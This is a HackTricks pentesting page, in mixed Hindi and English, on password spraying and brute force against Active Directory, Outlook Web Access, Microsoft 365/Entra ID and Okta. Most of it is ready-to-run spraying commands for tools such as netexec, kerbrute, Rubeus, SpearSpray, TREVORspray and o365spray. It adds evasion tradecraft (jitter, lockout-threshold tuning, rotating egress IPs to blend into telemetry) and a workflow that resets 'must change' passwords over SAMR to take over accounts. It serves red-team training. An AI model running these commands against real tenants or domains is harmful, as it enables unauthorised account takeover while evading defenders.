# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

एक बार जब आपको कई **valid usernames** मिल जाएं, तो आप पहचाने गए हर user के साथ सबसे **common passwords** (environment की password policy को ध्यान में रखते हुए) आज़मा सकते हैं।\
**default** रूप से **minimum** **password** **length** **7** है।

common usernames की lists भी उपयोगी हो सकती हैं: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

ध्यान दें कि अगर आप कई गलत passwords आज़माते हैं, तो आप कुछ accounts को **lockout** कर सकते हैं (default रूप से 10 से अधिक)।

### Get password policy

अगर आपके पास कुछ user credentials हैं या domain user के रूप में shell है, तो आप **with** password policy **get** कर सकते हैं:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Linux से (या सभी से) Exploitation

- **crackmapexec** का उपयोग करते हुए:
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- **NetExec (CME successor)** का उपयोग SMB/WinRM पर targeted, low-noise spraying के लिए:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Using [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(आप lockout से बचने के लिए attempts की संख्या बता सकते हैं):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Using [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NOT RECOMMENDED SOMETIMES DOESN'T WORK
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- `scanner/smb/smb_login` मॉड्यूल के साथ **Metasploit**:

![](<../../images/image (745).png>)

- **rpcclient** का उपयोग करके:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Windows से

- [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module के साथ:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) के साथ (यह डिफ़ॉल्ट रूप से domain से users जनरेट कर सकता है और domain से password policy प्राप्त करके उसी के अनुसार tries सीमित करेगा):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- With [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### "Password must change at next logon" Accounts (SAMR) को Identify और Take Over करना

एक low-noise technique है benign/empty password spray करना और उन accounts को catch करना जो STATUS_PASSWORD_MUST_CHANGE return करते हैं, जो indicate करता है कि password को forcibly expire किया गया था और पुराने password को जाने बिना बदला जा सकता है।

Workflow:
- Users enumerate करें (RID brute via SAMR) ताकि target list बनाई जा सके:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- एक खाली password spray करें और hits पर आगे बढ़ते रहें ताकि ऐसे accounts capture हों जिन्हें अगले logon पर change करना पड़ता है:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- प्रत्येक hit के लिए, NetExec के module के साथ SAMR पर password बदलें ("must change" set होने पर पुराने password की जरूरत नहीं होती):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
ऑपरेशनल नोट्स:
- Kerberos-based operations से पहले सुनिश्चित करें कि आपका host clock DC के साथ sync है: `sudo ntpdate <dc_fqdn>`.
- कुछ modules (जैसे, RDP/WinRM) में (Pwn3d!) के बिना एक [+] का मतलब है कि creds valid हैं, लेकिन account के पास interactive logon rights नहीं हैं।

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying SMB/NTLM/LDAP bind attempts की तुलना में noise कम करता है और AD lockout policies के साथ बेहतर align करता है। SpearSpray, LDAP-driven targeting, एक pattern engine, और policy awareness (domain policy + PSOs + badPwdCount buffer) को जोड़कर precisely और safely spray करता है। यह compromised principals को Neo4j में BloodHound pathing के लिए tag भी कर सकता है।

Key ideas:
- Paging और LDAPS support के साथ LDAP user discovery, optional custom LDAP filters का उपयोग करते हुए।
- Domain lockout policy + PSO-aware filtering ताकि configurable attempt buffer (threshold) छोड़ा जा सके और users lock न हों।
- Fast gssapi bindings का उपयोग करके Kerberos pre-auth validation (DCs पर 4625 के बजाय 4768/4771 generate करता है)।
- Pattern-based, per-user password generation using variables जैसे names और temporal values जो हर user के pwdLastSet से derived हों।
- Threads, jitter, और max requests per second के साथ throughput control।
- Optional Neo4j integration to mark owned users for BloodHound।

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
टार्गेटिंग और पैटर्न नियंत्रण:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Stealth and safety controls:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound समृद्धिकरण:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
पैटर्न सिस्टम ओवरव्यू (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers and org token: {separator}, {suffix}, {extra}

Operational notes:
- Favor querying the PDC-emulator with -dc to read the most authoritative badPwdCount and policy-related info.
- badPwdCount resets are triggered on the next attempt after the observation window; use threshold and timing to stay safe.
- Kerberos pre-auth attempts surface as 4768/4771 in DC telemetry; use jitter and rate-limiting to blend in.

> Tip: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

There are multiples tools for p**assword spraying outlook**.

- With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- With [Ruler](https://github.com/sensepost/ruler) (reliable!)
- With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

To use any of these tools, you need a user list and a password / a small list of passwords to spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

Cloud spraying के लिए, पहले यह पहचानें कि tenant **managed**, **federated**, या **hybrid** है, क्योंकि endpoint और lockout behavior on-prem AD से अलग हो सकते हैं। Microsoft Entra में, **Smart Lockout** बदलता है कि repeated guesses lockout budget को कैसे consume करते हैं:

- **Same bad password** को बार-बार दोहराने से lockout counter बढ़ता नहीं है, लेकिन **new candidates** आज़माने से बढ़ता है।
- **Familiar** और **unfamiliar** locations के **separate** counters होते हैं।
- **pass-through authentication (PTA)** उपयोग करने वाले tenants को bad-password hash tracking का benefit नहीं मिलता, इसलिए उन्हें classic lockout-sensitive targets की तरह treat करें।

Practical तौर पर, **one password per round** spray करें, rounds के बीच पर्याप्त spacing रखें, और ऐसी tooling prefer करें जो guesses भेजने से पहले tenant का actual auth flow discover कर सके।

- [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray) के साथ, आप tenant को recon कर सकते हैं, `token_endpoint` discover कर सकते हैं, `msol`/`adfs`/`owa`/`okta` spray कर सकते हैं, और traffic को multiple egress IPs के through rotate कर सकते हैं:
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- [**Spray365**](https://github.com/MarkoH17/Spray365) के साथ, आप एक resumable **execution plan** पहले से बना सकते हैं, auth order को randomize कर सकते हैं, और lockout window के बाहर रहने के लिए **minimum delay per user** लागू कर सकते हैं:
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- [**o365spray**](https://github.com/0xZDH/o365spray) के साथ, आप tenant को validate कर सकते हैं, `onedrive` जैसे modules के साथ users enumerate कर सकते हैं, और `oauth2` या `adfs` के जरिए spray कर सकते हैं, जबकि lockout window के दौरान **प्रति user एक attempt** बनाए रखते हैं। अगर आपके पास पहले से FireProx API है, तो source IPs को distribute करने के लिए इसे `--proxy-url` के साथ पास करें:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
Recent operator tradecraft ने भी **distributed cloud spraying** की ओर रुख किया है। [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) time windows, password shuffling, ADFS/M365 spraying, और automatic post-auth exfiltration को support करता है। हालिया real-world abuse में **Microsoft Teams API** account enumeration और **AWS region rotation** का भी उपयोग किया गया ताकि spray waves को कई source geographies में फैलाया जा सके।

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## References

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
